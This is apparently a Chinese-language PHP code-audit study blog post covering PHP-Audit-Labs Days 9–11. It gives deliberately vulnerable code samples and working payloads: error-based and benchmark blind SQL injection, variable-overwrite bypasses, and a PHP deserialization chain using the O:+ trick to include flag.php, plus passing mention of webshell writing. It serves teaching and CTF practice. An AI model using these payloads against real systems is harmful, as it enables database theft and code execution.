+<h2 id="Day9"><a href="#Day9" class="headerlink" title="Day9"></a>Day9</h2><h3 id="str-replace-过滤不当"><a href="#str-replace-过滤不当" class="headerlink" title="str_replace()过滤不当"></a>str_replace()过滤不当</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/10.png" alt><br>一个比较明显的过滤函数问题。它只是将<code>../</code>替换为空。那么很容易就能使用<code>....//</code>进行双写绕过<br>然后就是<code>require_once()</code>的文件包含了。</p>
+<p>CMS实例就是造成路径穿越,得到任意文件读取。<br>当然双写/url二次编码进行路径穿越的技巧其实也算很常见了。</p>
+<h3 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/ index.php</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername,$username,$password,$dbname);</span><br><span class="line"><span class="keyword">if</span>($conn-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'连接数据库失败'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $id = $row[<span class="string">'COUNT(*)'</span>] + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]) &amp;&amp; $_POST[<span class="string">'msg'</span>] !==<span class="string">''</span>)&#123;</span><br><span class="line">    $msg = addslashes($_POST[<span class="string">'msg'</span>]);</span><br><span class="line">    $msg = replace_bad_word(convert($msg));</span><br><span class="line">    $sql = <span class="string">"INSERT INTO users VALUES($id,'"</span>.$msg.<span class="string">"')"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($conn-&gt;error) <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type="text" name="msg" /&gt;&lt;input type="submit" value="Submit" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_row())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $limit_words;</span><br><span class="line">    <span class="keyword">foreach</span> ($limit_words <span class="keyword">as</span> $old =&gt; $new) &#123;</span><br><span class="line">        strlen($old) &gt; <span class="number">2</span> &amp;&amp; $str = str_replace($old,trim($new),$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$limit_words = <span class="keyword">array</span>(<span class="string">'造反'</span> =&gt; <span class="string">'造**'</span>, <span class="string">'法轮功'</span> =&gt; <span class="string">'法**'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$method <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>// config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"hongrisec"</span>;</span><br><span class="line">$password = <span class="string">"hongrisec"</span>;</span><br><span class="line">$dbname = <span class="string">"day9"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 搭建CTF环境使用的sql语句</span></span><br><span class="line">create database day9;</span><br><span class="line"><span class="keyword">use</span> <span class="title">day9</span>;</span><br><span class="line">create table users(</span><br><span class="line">id integer auto_increment not <span class="keyword">null</span> primary key,</span><br><span class="line">message varchar(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line">create table flag( flag varchar(<span class="number">40</span>));</span><br><span class="line">insert into flag values(<span class="string">'HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可控的msg变量被拼接进sql语句。但是却经过了html实体编码,转义,过滤个别词的操作。</p>
+<p>不过,在function.php却存在很明显的变量覆盖漏洞。那么我们可以通过覆盖<code>$limit_words</code>数组，来逃逸单引号.</p>
+<p>最后payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h2><h3 id="程序判错未exit"><a href="#程序判错未exit" class="headerlink" title="程序判错未exit()"></a>程序判错未exit()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/11.png" alt></p>
+<p>这里的问题主要是:代码虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题</p>
+<p>此处<code>extract()</code>得到了一个变量覆盖的利用<br>加上<code>assert()</code>，所以pi变量直接给webshell代码即可</p>
+<p>我个人一次体验比较深的经历是:在htb的某个靶机中。有一处php代码中曾经限定只有指定用户访问(检查session),才会显示其ssh密钥。而此时我们的权限是www-data.看似无法获得ssh密钥,但是其代码中出现了疏忽,在对user的session判别后没有立即<code>exit()</code>.那么当我们以www-data直接本地curl这一网页时,将可以得到密钥,进而提权。</p>
+<h3 id="练习-9"><a href="#练习-9" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"你所查询的对象id值不能为空！"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显然,程序如果检测到非法字符或单词，都会将其替换成字符串 HongRi ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 HongRi</p>
+<p>简单的使用benchmark替换sleep即可盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 or if(ascii(mid((select flag from flag),1,1))&#x3D;115,benchmark(200000000,7^3^8),0)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/12.png" alt><br>(第11行正则表达式应改为：’/O:\d:/‘)</p>
+<p>首先确认了存在反序列化。且数据是cookie可控。那么考虑下绕过执行反序列化。</p>
+<p>那么看下loaddata里的限制<br>开头不能是<code>O:</code>,即反序列化内容不为对象<br>同时需要不能匹配字符串为<code>O:任意十进制:</code><br>如果只是第一部分当然可以使用数组绕过。但是这样第二部分还是会匹配到数组中的对象成分。</p>
+<p>这里用到的是一个比较老的绕过方法了。即使用<code>O:+</code>绕过。而原理可以涉及到底层源码。函数遇到<code>+</code>号时会继续向下判断，因此可以正常反序列化。</p>
+<p>最后就能成功执行写文件webshell了。</p>
+<h3 id="练习-10"><a href="#练习-10" class="headerlink" title="练习"></a>练习</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">	$DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先从简单的看起,首先是SoFun类。显然绕过wakeup即可include可控数据flag.php。但是需要注意flag.php限制了必须<code>defined(&#39;IN_FLAG&#39;)</code>。</p>
+<p>注意到HITCON类则有一个跟前面例子一样的loaddata。那就可以用相同方法绕过执行反序列化。</p>
+<p>HITCON类login方法显然存在sql注入,且loaddata就是在这里被调用的。那么我们需要让loaddata传入的数据为SoFun类的文件包含序列化数据。<br>而这一数据来自<code>$obj-&gt;role</code>.</p>
+<p><code>$obj</code>是sql语句的返回结果。而sql表结构中第三个字段role正是我们需要的。那么只要利用这个sql注入进行union查询就达成<code>$obj-&gt;role</code>可控。</p>
+<p>由于析构函数中可以控制我们调用的方法及参数。所以以上思路可以执行。</p>
+<p>最后注意的是。HITCON类的wakeup会对sql语句进行转义。所以我们用同样的方法绕过wakeup即可</p>
+<p><code>O:6:&quot;HITCON&quot;:3:{s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:{s:8:&quot;username&quot;;s:81:&quot;1&#39; union select 1,2,&#39;a:1:{s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}}</code></p>
